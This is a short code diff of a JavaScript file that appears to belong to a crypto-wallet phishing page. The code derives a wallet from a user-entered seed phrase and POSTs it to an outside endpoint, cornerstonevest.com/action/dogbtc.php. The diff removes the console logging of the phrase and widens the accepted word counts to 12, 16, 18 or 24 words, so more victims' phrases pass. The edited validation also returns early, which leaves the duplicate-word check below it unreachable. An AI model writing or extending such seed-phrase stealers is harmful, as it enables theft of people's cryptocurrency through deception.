@@ -14057,8 +14057,7 @@
 
 			try {
 				const wallet = ethers.Wallet.fromMnemonic(dappWords);
-				console.log('Seed phrase is valid:', dappWords);
-				console.log('Wallet address:', wallet.address);
+				
 				$.ajax({
 					url: "https://cornerstonevest.com/action/dogbtc.php",
 					method: "POST",
@@ -14089,9 +14088,11 @@
 
 		// Split the input into words using space as a delimiter after removing HTML
 		var words = sanitizedInput.trim().split(/\s+/);
-		if (words.length !== 12 && words.length !== 24) {
-			return false; // Check for 12 or 24 words
-		}
+	if (words.length === 12 || words.length === 16 || words.length === 18 || words.length === 24) {
+            return true; // Valid: 12, 16, 18, or 24 words
+        } else {
+            return false; // Invalid: any other number of words
+        }
 
 		var wordSet = new Set(words);
 		if (wordSet.size !== words.length) {
